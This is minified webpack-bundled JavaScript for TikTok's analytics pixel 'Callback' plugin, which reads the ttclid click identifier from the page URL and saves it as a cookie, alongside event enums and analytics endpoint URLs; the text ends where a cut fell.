var globalVars = {};
Object.defineProperty(window, "set", {
  set: function (x) {
    globalVars.push(x);
  }
});
!function (e) {
  var r = {};
  function o(t) {
    if (r[t]) return r[t].exports;
    var n = r[t] = {
      i: t,
      l: !1,
      exports: {}
    };
    return e[t].call(n.exports, n, n.exports, o), n.l = !0, n.exports;
  }
  o.m = e, o.c = r, o.d = function (t, n, e) {
    o.o(t, n) || Object.defineProperty(t, n, {
      enumerable: !0,
      get: e
    });
  }, o.r = function (t) {
    "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(t, Symbol.toStringTag, {
      value: "Module"
    }), Object.defineProperty(t, "__esModule", {
      value: !0
    });
  }, o.t = function (n, t) {
    if (1 & t && (n = o(n)), 8 & t) return n;
    if (4 & t && "object" == typeof n && n && n.__esModule) return n;
    var e = Object.create(null);
    if (o.r(e), Object.defineProperty(e, "default", {
      enumerable: !0,
      value: n
    }), 2 & t && "string" != typeof n) for (var r in n) o.d(e, r, function (t) {
      return n[t];
    }.bind(null, r));
    return e;
  }, o.n = function (t) {
    var n = t && t.__esModule ? function () {
      return t["default"];
    } : function () {
      return t;
    };
    return o.d(n, "a", n), n;
  }, o.o = function (t, n) {
    return Object.prototype.hasOwnProperty.call(t, n);
  }, o.p = "https://analytics.tiktok.com/i18n/pixel/", o(o.s = "ranp");
}({
  "/6w+": function (t, n, e) {
    "use strict";

    var r, o, i;
    e.d(n, "b", function () {
      return r;
    }), e.d(n, "a", function () {
      return o;
    }), e.d(n, "c", function () {
      return i;
    }), (n = r = r || {})[n.OTHER = 0] = "OTHER", n[n.ANDROID = 1] = "ANDROID", n[n.IOS = 2] = "IOS", (n = o = o || {}).LOAD_START = "load_start", n.LOAD_END = "load_end", n.BEFORE_INIT = "before_init", n.INIT_START = "init_start", n.INIT_END = "init_end", n.JSB_INIT_START = "jsb_init_start", n.JSB_INIT_END = "jsb_init_end", n.BEFORE_AD_INFO_INIT_START = "before_ad_info_init_start", n.AD_INFO_INIT_START = "ad_info_init_start", n.AD_INFO_INIT_END = "ad_info_init_end", n.IDENTIFY_INIT_START = "identify_init_start", n.IDENTIFY_INIT_END = "identify_init_end", n.PLUGIN_INIT_START = "_init_start", n.PLUGIN_INIT_END = "_init_end", n.PIXEL_SEND = "pixel_send", n.PIXEL_SEND_PCM = "pixel_send_PCM", n.JSB_SEND = "jsb_send", n.HTTP_SEND = "http_send", n.HANDLE_CACHE = "handle_cache", n.INIT_ERROR = "init_error", n.PIXEL_EMPTY = "pixel_empty", n.JSB_ERROR = "jsb_error", n.API_ERROR = "api_error", n.PLUGIN_ERROR = "plugin_error", n.CUSTOM_INFO = "custom_info", n.CUSTOM_ERROR = "custom_error", (n = i = i || {})[n.IFRAME = 1] = "IFRAME", n[n.NORMAL = 2] = "NORMAL", n[n.WEBWORKER = 3] = "WEBWORKER";
  },
  "0fq1": function (t, n, e) {
    "use strict";

    e.d(n, "b", function () {
      return d;
    }), e.d(n, "a", function () {
      return p;
    });
    var r = e("SbFU"),
      o = e("fe1q"),
      i = e("/6w+"),
      u = e("ZFXO"),
      c = undefined && undefined.__awaiter || function (t, n, c, a) {
        return new (c = c || Promise)(function (e, r) {
          function o(t) {
            try {
              u(a.next(t));
            } catch (n) {
              r(n);
            }
          }
          function i(t) {
            try {
              u(a["throw"](t));
            } catch (n) {
              r(n);
            }
          }
          function u(t) {
            var n;
            t.done ? e(t.value) : ((n = t.value) instanceof c ? n : new c(function (t) {
              t(n);
            })).then(o, i);
          }
          u((a = a.apply(t, n || [])).next());
        });
      },
      a = undefined && undefined.__generator || function (e, r) {
        var o,
          i,
          u,
          c = {
            label: 0,
            sent: function () {
              if (1 & u[0]) throw u[1];
              return u[1];
            },
            trys: [],
            ops: []
          },
          t = {
            next: n(0),
            "throw": n(1),
            "return": n(2)
          };
        return "function" == typeof Symbol && (t[Symbol.iterator] = function () {
          return this;
        }), t;
        function n(n) {
          return function (t) {
            return a([n, t]);
          };
        }
        function a(t) {
          if (o) throw new TypeError("Generator is already executing.");
          for (; c;) try {
            if (o = 1, i && (u = 2 & t[0] ? i["return"] : t[0] ? i["throw"] || ((u = i["return"]) && u.call(i), 0) : i.next) && !(u = u.call(i, t[1])).done) return u;
            switch (i = 0, (t = u ? [2 & t[0], u.value] : t)[0]) {
              case 0:
              case 1:
                u = t;
                break;
              case 4:
                return c.label++, {
                  value: t[1],
                  done: !1
                };
              case 5:
                c.label++, i = t[1], t = [0];
                continue;
              case 7:
                t = c.ops.pop(), c.trys.pop();
                continue;
              default:
                if (!(u = 0 < (u = c.trys).length && u[u.length - 1]) && (6 === t[0] || 2 === t[0])) {
                  c = 0;
                  continue;
                }
                if (3 === t[0] && (!u || t[1] > u[0] && t[1] < u[3])) {
                  c.label = t[1];
                  break;
                }
                if (6 === t[0] && c.label < u[1]) {
                  c.label = u[1], u = t;
                  break;
                }
                if (u && c.label < u[2]) {
                  c.label = u[2], c.ops.push(t);
                  break;
                }
                u[2] && c.ops.pop(), c.trys.pop();
                continue;
            }
            t = r.call(e, c);
          } catch (n) {
            t = [6, n], i = 0;
          } finally {
            o = u = 0;
          }
          if (5 & t[0]) throw t[1];
          return {
            value: t[0] ? t[1] : void 0,
            done: !0
          };
        }
      },
      f = {},
      l = function () {
        return (Object(r.e)() || [])._sapi || self._sapi || {};
      },
      s = function (t, n) {
        f[t] || (f[t] = !0, Object(o.a)(i.a.CUSTOM_ERROR, n, {
          custom_name: "shopify_sandbox_api_error",
          custom_enum: t
        }));
      },
      d = function (e) {
        return c(void 0, void 0, void 0, function () {
          var n;
          return a(this, function (t) {
            switch (t.label) {
              case 0:
                if (!(n = l().browser) || !n.cookie) return [3, 4];
                t.label = 1;
              case 1:
                return t.trys.push([1, 3,, 4]), [4, n.cookie.set(e)];
              case 2:
                return t.sent(), [3, 4];
              case 3:
                return n = t.sent(), s("cookie_set", n), [3, 4];
              case 4:
                return [2];
            }
          });
        });
      },
      p = function (e, r) {
        return c(void 0, void 0, void 0, function () {
          var n;
          return a(this, function (t) {
            switch (t.label) {
              case 0:
                return t.trys.push([0, 2,, 3]), [4, self.fetch(e, {
                  method: "POST",
                  credentials: e === u.i ? "include" : "same-origin",
                  body: JSON.stringify(r || {})
                })];
              case 1:
                return t.sent(), [2, !0];
              case 2:
                return n = t.sent(), Object(o.a)(i.a.CUSTOM_ERROR, n, {
                  custom_name: "shopify_sandbox_api_error",
                  custom_enum: "fetchAPI"
                }), [3, 3];
              case 3:
                return [2, !1];
            }
          });
        });
      };
  },
  "2HLQ": function (t, n, e) {
    "use strict";

    var r;
    e.d(n, "a", function () {
      return r;
    }), (n = r = r || {})[n.NOT_SURE = 0] = "NOT_SURE", n[n.INVOKE_METHOD_ENABLED = 1] = "INVOKE_METHOD_ENABLED", n[n.INVOKE_METHOD_NOT_ENABLED = 2] = "INVOKE_METHOD_NOT_ENABLED", n[n.TOUTIAO_BRIDGE_NOT_ENABLED = 3] = "TOUTIAO_BRIDGE_NOT_ENABLED";
  },
  GJ6r: function (t, p, _) {
    "use strict";

    !function (t) {
      _.d(p, "a", function () {
        return r;
      }), _.d(p, "g", function () {
        return o;
      }), _.d(p, "e", function () {
        return c;
      }), _.d(p, "f", function () {
        return a;
      }), _.d(p, "b", function () {
        return l;
      }), _.d(p, "d", function () {
        return s;
      }), _.d(p, "c", function () {
        return d;
      });
      var n = _("SbFU"),
        e = (_("2HLQ"), _("IOsT"), _("w0s3")),
        r = function () {
          return "undefined" != typeof globalThis ? globalThis : "undefined" != typeof self ? self : "undefined" != typeof window ? window : void 0 !== t ? t : new Function("return this")();
        },
        o = function () {
          var t = r();
          return "undefined" != typeof t.DedicatedWorkerGlobalScope ? t instanceof t.DedicatedWorkerGlobalScope : "DedicatedWorkerGlobalScope" === t.constructor.name;
        },
        i = function () {
          var t = r();
          return "object" == typeof navigator ? navigator.userAgent : t._userAgent || "";
        },
        u = function () {
          var t;
          return (null === (t = null === (t = Object(n.e)()) || void 0 === t ? void 0 : t._env) || void 0 === t ? void 0 : t.env) || e.b;
        },
        c = function () {
          return u() !== e.b;
        },
        a = function () {
          return u() === e.i;
        },
        f = (Object(n.n)(function () {
          return /open_news/i.test(i());
        }), Object(n.n)(function () {
          return /ultralite/i.test(i());
        }), function () {
          return /windows phone/i.test(i()) ? "Windows Phone" : /android/i.test(i()) ? "android" : /iPad|iPhone|iPod/.test(i()) ? "ios" : "pc";
        }),
        l = function () {
          return "android" === f();
        },
        s = function () {
          return "ios" === f();
        },
        d = function () {
          return "development" === "production".trim();
        };
    }.call(this, _("yLpj"));
  },
  HyyX: function (t, n, e) {
    "use strict";

    e.d(n, "c", function () {
      return r;
    }), e.d(n, "a", function () {
      return o;
    }), e.d(n, "b", function () {
      return i;
    });
    var r = ["email", "phone_number", "auto_email", "auto_phone_number", "external_id", "sha256_email", "sha256_phone_number", "sha256_external_id"];
    (n = u = u || {}).missing = "missing", n.valid = "valid", n.invalid = "invalid", (n = {}).empty = "empty", n.whitespace = "whitespace", n.hardcode = "hardcode", n.encode = "encode", (n = {}).invalidCountry = "invalid_country", n.notANumber = "not_a_number", n.tooShort = "too_short", n.tooLong = "too_long", n.invalidLength = "invalid_length", n.emptyCountryCodeThroughIP = "empty_country_code_through_ip", n.invalidCountryAfterInjectPlus = "invalid_country_after_inject_plus", n.notANumberAfterInjectPlus = "not_a_number_after_inject_plus", n.tooShortAfterInjectPlus = "too_short_after_inject_plus", n.tooLongAfterInjectPlus = "too_long_after_inject_plus", n.invalidLengthAfterInjectPlus = "invalid_length_after_inject_plus", n.invalidCountryAfterInjectCountry = "invalid_country_after_inject_country", n.notANumberAfterInjectCountry = "not_a_number_after_inject_country", n.tooShortAfterInjectCountry = "too_short_after_inject_country", n.tooLongAfterInjectCountry = "too_long_after_inject_country", n.invalidLengthAfterInjectCountry = "invalid_length_after_inject_country", (n = {}).letterCase = "letter_case", n.isNotValidEmail = "is_not_valid_email", n.isNotPossibleEmail = "is_not_possible_email", n.domainTypo = "domain_typo", n.addressFormat = "address_format";
    var o, i, u;
    u.missing, u.missing, u.missing, u.missing, u.missing, u.missing;
    (u = o = o || {}).EMPTY_VALUE = "empty_value", u.WRONG_FORMAT = "wrong_format", u.CORRECT_FORMAT = "correct_format", u.HASHED = "hashed", u.HASHED_ERR = "hashed_err", u.HASHED_CORRECT = "hashed_correct", u.PLAINTEXT_EMAIL = "plaintext_email", u.PLAINTEXT_PHONE = "plaintext_phone", (u = i = i || {}).EMPTY_VALUE = "empty_value", u.PLAIN_EMAIL = "plain_email", u.PLAIN_PHONE = "plain_phone", u.HASHED = "hashed", u.FILTER_EVENTS = "filter_events", u.UNKNOWN_INVALID = "unknown_invalid", u.BASE64_STRING_HASHED = "base64_string_hashed", u.BASE64_HEX_HASHED = "base64_hex_hashed", u.PLAIN_MDN_EMAIL = "plain_mdn_email", (u = {}).Manual = "manual", u.Auto = "auto";
  },
  IOsT: function (t, n, e) {
    "use strict";

    var r;
    e.d(n, "a", function () {
      return r;
    }), (n = r = r || {}).Normal = "1", n.Iframe = "2", n.WebWorker = "3", n.SandboxIframe = "4";
  },
  Pd38: function (t, n, e) {
    "use strict";

    e.d(n, "a", function () {
      return r;
    });
    var o = e("SbFU"),
      r = function (n, t, e) {
        void 0 === e && (e = !1);
        var r = Object(o.e)() || [];
        if (r.dynamicPlugins || (r.dynamicPlugins = []), !r.dynamicPlugins.find(function (t) {
          return t.name === n;
        })) {
          if (!e) if (!Object(o.m)(n)) return;
          r.dynamicPlugins.push({
            name: n,
            handler: t
          });
        }
      };
  },
  SbFU: function (t, n, e) {
    "use strict";

    e.d(n, "f", function () {
      return c;
    }), e.d(n, "j", function () {
      return a;
    }), e.d(n, "e", function () {
      return f;
    }), e.d(n, "m", function () {
      return l;
    }), e.d(n, "l", function () {
      return s;
    }), e.d(n, "g", function () {
      return d;
    }), e.d(n, "h", function () {
      return p;
    }), e.d(n, "d", function () {
      return _;
    }), e.d(n, "p", function () {
      return h;
    }), e.d(n, "c", function () {
      return y;
    }), e.d(n, "o", function () {
      return b;
    }), e.d(n, "n", function () {
      return v;
    }), e.d(n, "k", function () {
      return m;
    }), e.d(n, "b", function () {
      return g;
    }), e.d(n, "a", function () {
      return w;
    }), e.d(n, "i", function () {
      return O;
    });
    e("GJ6r");
    var r = e("w0s3"),
      o = (e("HyyX"), undefined && undefined.__awaiter || function (t, n, c, a) {
        return new (c = c || Promise)(function (e, r) {
          function o(t) {
            try {
              u(a.next(t));
            } catch (n) {
              r(n);
            }
          }
          function i(t) {
            try {
              u(a["throw"](t));
            } catch (n) {
              r(n);
            }
          }
          function u(t) {
            var n;
            t.done ? e(t.value) : ((n = t.value) instanceof c ? n : new c(function (t) {
              t(n);
            })).then(o, i);
          }
          u((a = a.apply(t, n || [])).next());
        });
      }),
      i = undefined && undefined.__generator || function (e, r) {
        var o,
          i,
          u,
          c = {
            label: 0,
            sent: function () {
              if (1 & u[0]) throw u[1];
              return u[1];
            },
            trys: [],
            ops: []
          },
          t = {
            next: n(0),
            "throw": n(1),
            "return": n(2)
          };
        return "function" == typeof Symbol && (t[Symbol.iterator] = function () {
          return this;
        }), t;
        function n(n) {
          return function (t) {
            return a([n, t]);
          };
        }
        function a(t) {
          if (o) throw new TypeError("Generator is already executing.");
          for (; c;) try {
            if (o = 1, i && (u = 2 & t[0] ? i["return"] : t[0] ? i["throw"] || ((u = i["return"]) && u.call(i), 0) : i.next) && !(u = u.call(i, t[1])).done) return u;
            switch (i = 0, (t = u ? [2 & t[0], u.value] : t)[0]) {
              case 0:
              case 1:
                u = t;
                break;
              case 4:
                return c.label++, {
                  value: t[1],
                  done: !1
                };
              case 5:
                c.label++, i = t[1], t = [0];
                continue;
              case 7:
                t = c.ops.pop(), c.trys.pop();
                continue;
              default:
                if (!(u = 0 < (u = c.trys).length && u[u.length - 1]) && (6 === t[0] || 2 === t[0])) {
                  c = 0;
                  continue;
                }
                if (3 === t[0] && (!u || t[1] > u[0] && t[1] < u[3])) {
                  c.label = t[1];
                  break;
                }
                if (6 === t[0] && c.label < u[1]) {
                  c.label = u[1], u = t;
                  break;
                }
                if (u && c.label < u[2]) {
                  c.label = u[2], c.ops.push(t);
                  break;
                }
                u[2] && c.ops.pop(), c.trys.pop();
                continue;
            }
            t = r.call(e, c);
          } catch (n) {
            t = [6, n], i = 0;
          } finally {
            o = u = 0;
          }
          if (5 & t[0]) throw t[1];
          return {
            value: t[0] ? t[1] : void 0,
            done: !0
          };
        }
      },
      u = undefined && undefined.__read || function (t, n) {
        var e = "function" == typeof Symbol && t[Symbol.iterator];
        if (!e) return t;
        var r,
          o,
          i = e.call(t),
          u = [];
        try {
          for (; (void 0 === n || 0 < n--) && !(r = i.next()).done;) u.push(r.value);
        } catch (c) {
          o = {
            error: c
          };
        } finally {
          try {
            r && !r.done && (e = i["return"]) && e.call(i);
          } finally {
            if (o) throw o.error;
          }
        }
        return u;
      },
      c = (undefined && undefined.__spread, function () {
        var t = f();
        return t._partner || "";
      }),
      a = function () {
        var t = f();
        return t && t.initialize;
      },
      f = function () {
        return "object" == typeof window && window["object" == typeof window && window[r.f] || r.c];
      },
      l = function (t) {
        try {
          var n = f()._plugins || {};
          return null == n[t] || !!n[t];
        } catch (e) {
          return !0;
        }
      },
      s = function () {
        try {
          var t = f();
          return t && t._legacy && 0 !== t._legacy.length ? Object.keys(t._t).length > Object.keys(t._legacy).length || Object.keys(t.context.data.pixelMap).length > Object.keys(t._legacy).length : !1;
        } catch (n) {
          return !1;
        }
      },
      d = function (t) {
        try {
          var n = f();
          if (n && n._self_host_config && n._self_host_config[t]) return n._self_host_config[t] || "";
        } catch (e) {
          return "";
        }
        return "";
      },
      p = function () {
        var t;
        try {
          return (null === (t = f()) || void 0 === t ? void 0 : t._usd_exchange_rate) || null;
        } catch (n) {
          return null;
        }
      },
      _ = function () {
        return new Date(Date.now() + 864e5).toUTCString();
      };
    function h(e, r) {
      void 0 === r && (r = 500);
      var o = Date.now();
      return function () {
        var t = arguments,
          n = Date.now();
        r <= n - o && (e.apply(null, t), o = Date.now());
      };
    }
    function y(e, r, o) {
      var i;
      return function () {
        for (var t = [], n = 0; n < arguments.length; n++) t[n] = arguments[n];
        clearTimeout(i), i = setTimeout(function () {
          e.apply(o, t);
        }, r);
      };
    }
    function b(n) {
      return void 0 === n && (n = 500), o(this, void 0, void 0, function () {
        return i(this, function (t) {
          return [2, new Promise(function (t) {
            setTimeout(function () {
              t(!0);
            }, n);
          })];
        });
      });
    }
    function v(e, r) {
      var o,
        i = e;
      return function () {
        for (var t = [], n = 0; n < arguments.length; n++) t[n] = arguments[n];
        return i && (o = e.apply(r, t), i = null), o;
      };
    }
    function m(t, n) {
      return 0 < Object.keys(function i(t, n) {
        var e = {};
        for (var r in t) {
          var o;
          t.hasOwnProperty(r) && !n.hasOwnProperty(r) ? e[r] = t[r] : t.hasOwnProperty(r) && n.hasOwnProperty(r) && t[r] !== n[r] && ("object" == typeof t[r] && "object" == typeof n[r] ? (o = i(t[r], n[r]), 0 < Object.keys(o).length && (e[r] = o)) : e[r] = t[r]);
        }
        for (var r in n) n.hasOwnProperty(r) && !t.hasOwnProperty(r) && (e[r] = n[r]);
        return e;
      }(t, n)).length;
    }
    var g = ["input[type='button']", "input[type='image']", "input[type='submit']", "button", "[class*=btn]", "[class*=Btn]", "[class*=button]", "[class*=Button]", "[role*=button]", "[id*=btn]", "[id*=Btn]", "[id*=button]", "[id*=Button]", "a"],
      w = ["[href^='tel:']", "[href^='callto:']", "[href^='sms:']", "[href^='skype:']", "[href^='whatsapp:']", "[href^='mailto:']"],
      O = function (n) {
        var t = g.some(function (t) {
            return n.matches(t);
          }),
          e = w.some(function (t) {
            return n.matches(t);
          });
        return t && !e;
      };
  },
  SnBs: function (t, n, e) {
    "use strict";

    e.d(n, "a", function () {
      return o;
    });
    var r,
      n = undefined && undefined.__extends || (r = function (t, n) {
        return (r = Object.setPrototypeOf || {
          __proto__: []
        } instanceof Array && function (t, n) {
          t.__proto__ = n;
        } || function (t, n) {
          for (var e in n) n.hasOwnProperty(e) && (t[e] = n[e]);
        })(t, n);
      }, function (t, n) {
        function e() {
          this.constructor = t;
        }
        r(t, n), t.prototype = null === n ? Object.create(n) : (e.prototype = n.prototype, new e());
      }),
      o = (i.prototype.pageDidLoad = function () {}, i.prototype.pixelDidMount = function (t) {}, i.prototype.pageUrlWillChange = function (t, n) {}, i.prototype.pageUrlDidChange = function (t, n) {}, i.prototype.initStart = function () {}, i.prototype.initEnd = function () {}, i.prototype.adInfoInitStart = function () {}, i.prototype.adInfoInitEnd = function () {}, i.prototype.contextInitStart = function () {}, i.prototype.contextInitEnd = function () {}, i.prototype.pluginInitStart = function (t) {}, i.prototype.pluginInitEnd = function (t) {}, i.prototype.pixelCreateStart = function (t) {}, i.prototype.pixelCreateEnd = function (t) {}, i.prototype.pixelInitEnd = function (t) {}, i.prototype.pixelSend = function (t, n, e, r, o) {}, i.prototype.pageWillLeave = function (t) {}, i);
    function i(t) {
      t && (this.context = t);
    }
    var u;
    n(c, u = o), c.prototype.pixelDidMount = function (t) {
      var n = t.pixelCode,
        t = this.getTrackType(),
        e = this.context.methods.batchTrack.bind(this.context, {
          pixelCode: n,
          type: t
        });
      this.batchReportFunctions.push(e), this.stash.forEach(function (t) {
        e(t, !1);
      });
    }, c.prototype.pageUrlWillChange = function (t, n) {}, c.prototype.pageUrlDidChange = function (t) {
      t !== this.currentUrl && (this.oldUrl = this.currentUrl, this.currentUrl = t);
    }, c.prototype.handleCacheData = function () {
      var t = this;
      this.stash.forEach(function (n) {
        t.batchReportFunctions.forEach(function (t) {
          t(n, !1);
        });
      });
    }, c.prototype.track = function (n, e) {
      this.stash.push(n), this.batchReportFunctions.forEach(function (t) {
        t(n, e);
      });
    };
    function c(t) {
      var e = u.call(this, t) || this;
      return e.batchReportFunctions = [], e.currentUrl = "", e.oldUrl = "", e.stash = [], e.batchReportFunctions = e.context.methods.getAllPixels().map(function (t) {
        var n = t.pixelCode,
          t = e.getTrackType();
        return e.context.methods.batchTrack.bind(e.context, {
          pixelCode: n,
          type: t
        });
      }), e;
    }
  },
  ZFXO: function (t, n, e) {
    "use strict";

    e.d(n, "a", function () {
      return r;
    }), e.d(n, "f", function () {
      return o;
    }), e.d(n, "i", function () {
      return i;
    }), e.d(n, "g", function () {
      return u;
    }), e.d(n, "d", function () {
      return c;
    }), e.d(n, "h", function () {
      return a;
    }), e.d(n, "c", function () {
      return f;
    }), e.d(n, "e", function () {
      return l;
    }), e.d(n, "b", function () {
      return s;
    }), e.d(n, "j", function () {
      return d;
    });
    var r = "tt_adInfo",
      o = "https://analytics.tiktok.com/api/v2/pcm",
      i = "https://analytics.tiktok.com/api/v2/shopify_pixel",
      u = "https://analytics.tiktok.com/api/v2/performance",
      c = "https://analytics.tiktok.com/api/v2/interaction",
      a = "https://analytics.tiktok.com/api/v2/performance_interaction",
      f = "https://analytics.tiktok.com/api/v2/pixel/act",
      l = "https://analytics.pangle-ads.com/api/v2/pangle_pixel",
      s = "https://analytics.pangle-ads.com/api/v2/pangle_disable_cookie",
      d = "https://analytics.tiktok.com/api/v2/pixel";
  },
  fe1q: function (t, n, e) {
    "use strict";

    e.d(n, "c", function () {
      return r;
    }), e.d(n, "a", function () {
      return i;
    }), e.d(n, "b", function () {
      return u;
    });
    var o = e("SbFU");
    function r() {
      for (var t = [], n = 0; n < arguments.length; n++) t[n] = arguments[n];
      try {
        var e = Object(o.e)().monitor;
        e && e.info.apply(e, t);
      } catch (r) {}
    }
    function i() {
      for (var t = [], n = 0; n < arguments.length; n++) t[n] = arguments[n];
      try {
        var e = Object(o.e)().monitor;
        e && e.error.apply(e, t);
      } catch (r) {}
    }
    function u() {
      try {
        0;
        var t = document && document.currentScript,
          n = t && t.src || "http://emptyURLSrc",
          e = /i18n\/pixel\/events\.js/.test(n),
          r = /i18n\/pixel\/sdk\.js/.test(n),
          o = new URL(n).searchParams,
          i = o.get("sdkid") || t && t.getAttribute("data-id") || "";
        return e ? {
          lib: o.get("lib") || "ttq",
          pixelCode: i
        } : r ? {
          lib: "_taq",
          pixelCode: i
        } : {
          lib: "ttq",
          pixelCode: i
        };
      } catch (u) {
        return {
          lib: "ttq",
          pixelCode: ""
        };
      }
    }
  },
  qGTL: function (t, n, e) {
    "use strict";

    e.d(n, "a", function () {
      return r;
    }), e.d(n, "b", function () {
      return o;
    });
    var r = function (t, n) {
      n = o(n || window.location.href, t);
      return n || o(document.referrer, t);
    };
    function o(t, n) {
      try {
        return new URL(t).searchParams.get(n) || "";
      } catch (e) {
        return "";
      }
    }
  },
  ranp: function (t, n, e) {
    "use strict";

    e.r(n);
    var r,
      o,
      i = e("SnBs"),
      u = e("qGTL"),
      c = e("SbFU"),
      l = (e("0fq1"), undefined && undefined.__awaiter || function (t, n, c, a) {
        return new (c = c || Promise)(function (e, r) {
          function o(t) {
            try {
              u(a.next(t));
            } catch (n) {
              r(n);
            }
          }
          function i(t) {
            try {
              u(a["throw"](t));
            } catch (n) {
              r(n);
            }
          }
          function u(t) {
            var n;
            t.done ? e(t.value) : ((n = t.value) instanceof c ? n : new c(function (t) {
              t(n);
            })).then(o, i);
          }
          u((a = a.apply(t, n || [])).next());
        });
      }),
      s = undefined && undefined.__generator || function (e, r) {
        var o,
          i,
          u,
          c = {
            label: 0,
            sent: function () {
              if (1 & u[0]) throw u[1];
              return u[1];
            },
            trys: [],
            ops: []
          },
          t = {
            next: n(0),
            "throw": n(1),
            "return": n(2)
          };
        return "function" == typeof Symbol && (t[Symbol.iterator] = function () {
          return this;
        }), t;
        function n(n) {
          return function (t) {
            return a([n, t]);
          };
        }
        function a(t) {
          if (o) throw new TypeError("Generator is already executing.");
          for (; c;) try {
            if (o = 1, i && (u = 2 & t[0] ? i["return"] : t[0] ? i["throw"] || ((u = i["return"]) && u.call(i), 0) : i.next) && !(u = u.call(i, t[1])).done) return u;
            switch (i = 0, (t = u ? [2 & t[0], u.value] : t)[0]) {
              case 0:
              case 1:
                u = t;
                break;
              case 4:
                return c.label++, {
                  value: t[1],
                  done: !1
                };
              case 5:
                c.label++, i = t[1], t = [0];
                continue;
              case 7:
                t = c.ops.pop(), c.trys.pop();
                continue;
              default:
                if (!(u = 0 < (u = c.trys).length && u[u.length - 1]) && (6 === t[0] || 2 === t[0])) {
                  c = 0;
                  continue;
                }
                if (3 === t[0] && (!u || t[1] > u[0] && t[1] < u[3])) {
                  c.label = t[1];
                  break;
                }
                if (6 === t[0] && c.label < u[1]) {
                  c.label = u[1], u = t;
                  break;
                }
                if (u && c.label < u[2]) {
                  c.label = u[2], c.ops.push(t);
                  break;
                }
                u[2] && c.ops.pop(), c.trys.pop();
                continue;
            }
            t = r.call(e, c);
          } catch (n) {
            t = [6, n], i = 0;
          } finally {
            o = u = 0;
          }
          if (5 & t[0]) throw t[1];
          return {
            value: t[0] ? t[1] : void 0,
            done: !0
          };
        }
      },
      d = "",
      p = function (t) {
        "number" == typeof (t = Object.assign({}, {
          path: "/"
        }, t)).expires && (t.expires = new Date(Date.now() + 864e5 * t.expires)), t.expires instanceof Date && (t.expires = t.expires.toUTCString());
        var n,
          e = "";
        for (n in t) t[n] && (e += "; " + n, !0 !== t[n] && (e += "=" + t[n].split(";")[0]));
        return e;
      },
      _ = function (t) {
        if (0 === document.cookie.length) return "";
        var n = document.cookie.indexOf(t + "=");
        if (-1 === n) return "";
        n = n + t.length + 1, t = document.cookie.indexOf(";", n);
        return -1 === t ? unescape(document.cookie.substring(n)) : unescape(document.cookie.substring(n, t));
      },
      a = undefined && undefined.__awaiter || function (t, n, c, a) {
        return new (c = c || Promise)(function (e, r) {
          function o(t) {
            try {
              u(a.next(t));
            } catch (n) {
              r(n);
            }
          }
          function i(t) {
            try {
              u(a["throw"](t));
            } catch (n) {
              r(n);
            }
          }
          function u(t) {
            var n;
            t.done ? e(t.value) : ((n = t.value) instanceof c ? n : new c(function (t) {
              t(n);
            })).then(o, i);
          }
          u((a = a.apply(t, n || [])).next());
        });
      },
      f = undefined && undefined.__generator || function (e, r) {
        var o,
          i,
          u,
          c = {
            label: 0,
            sent: function () {
              if (1 & u[0]) throw u[1];
              return u[1];
            },
            trys: [],
            ops: []
          },
          t = {
            next: n(0),
            "throw": n(1),
            "return": n(2)
          };
        return "function" == typeof Symbol && (t[Symbol.iterator] = function () {
          return this;
        }), t;
        function n(n) {
          return function (t) {
            return a([n, t]);
          };
        }
        function a(t) {
          if (o) throw new TypeError("Generator is already executing.");
          for (; c;) try {
            if (o = 1, i && (u = 2 & t[0] ? i["return"] : t[0] ? i["throw"] || ((u = i["return"]) && u.call(i), 0) : i.next) && !(u = u.call(i, t[1])).done) return u;
            switch (i = 0, (t = u ? [2 & t[0], u.value] : t)[0]) {
              case 0:
              case 1:
                u = t;
                break;
              case 4:
                return c.label++, {
                  value: t[1],
                  done: !1
                };
              case 5:
                c.label++, i = t[1], t = [0];
                continue;
              case 7:
                t = c.ops.pop(), c.trys.pop();
                continue;
              default:
                if (!(u = 0 < (u = c.trys).length && u[u.length - 1]) && (6 === t[0] || 2 === t[0])) {
                  c = 0;
                  continue;
                }
                if (3 === t[0] && (!u || t[1] > u[0] && t[1] < u[3])) {
                  c.label = t[1];
                  break;
                }
                if (6 === t[0] && c.label < u[1]) {
                  c.label = u[1], u = t;
                  break;
                }
                if (u && c.label < u[2]) {
                  c.label = u[2], c.ops.push(t);
                  break;
                }
                u[2] && c.ops.pop(), c.trys.pop();
                continue;
            }
            t = r.call(e, c);
          } catch (n) {
            t = [6, n], i = 0;
          } finally {
            o = u = 0;
          }
          if (5 & t[0]) throw t[1];
          return {
            value: t[0] ? t[1] : void 0,
            done: !0
          };
        }
      },
      h = function (n, e, r, o) {
        return void 0 === r && (r = "/"), void 0 === o && (o = Object(c.d)()), a(void 0, void 0, void 0, function () {
          return f(this, function (t) {
            var c, a, f;
            return c = n, a = e, f = {
              path: r,
              expires: o
            }, l(void 0, void 0, void 0, function () {
              var e, r, o, i, u;
              return s(this, function (t) {
                switch (t.label) {
                  case 0:
                    return [3, 2];
                  case 1:
                    return t.sent(), [3, 3];
                  case 2:
                    try {
                      if (f) {
                        if (d) return f.domain = d, document.cookie = c + "=" + a + p(f), [2];
                        for (e = f.domain || window.location.hostname, r = e.split("."), o = r.length, i = "", u = 0; u < o; u++) if (i = "." + r[o - u - 1] + i, f.domain = i, document.cookie = c + "=" + a + p(f), _(c)) {
                          d = i;
                          break;
                        }
                      } else document.cookie = c + "=" + a + p(f);
                    } catch (n) {}
                    t.label = 3;
                  case 3:
                    return [2, Promise.resolve()];
                }
              });
            }), [2];
          });
        });
      },
      y = undefined && undefined.__extends || (r = function (t, n) {
        return (r = Object.setPrototypeOf || {
          __proto__: []
        } instanceof Array && function (t, n) {
          t.__proto__ = n;
        } || function (t, n) {
          for (var e in n) n.hasOwnProperty(e) && (t[e] = n[e]);
        })(t, n);
      }, function (t, n) {
        function e() {
          this.constructor = t;
        }
        r(t, n), t.prototype = null === n ? Object.create(n) : (e.prototype = n.prototype, new e());
      }),
      b = "Callback",
      v = (o = i.a, y(m, o), m.prototype.contextInitStart = function () {}, m.prototype.pixelDidMount = function () {
        var t = Object(u.a)("ttclid");
        t && h("ttclid", t);
      }, m.prototype.beforeShopifyPixelSend = function (t, n) {
        t = Object(u.b)(t, "ttclid");
        (t = t || Object(u.b)(n, "ttclid")) && h("ttclid", t);
      }, m);
    function m(t) {
      t = o.call(this, t) || this;
      return t.name = b, t;
    }
    e = e("Pd38");
    Object(e.a)(b, function (t) {
      return new v(t);
    });
    n["default"] = v;
  },
  "u+wH": function (t, n, e) {
    "use strict";

    e.r(n), e.d(n, "nanoid", function () {
      return c;
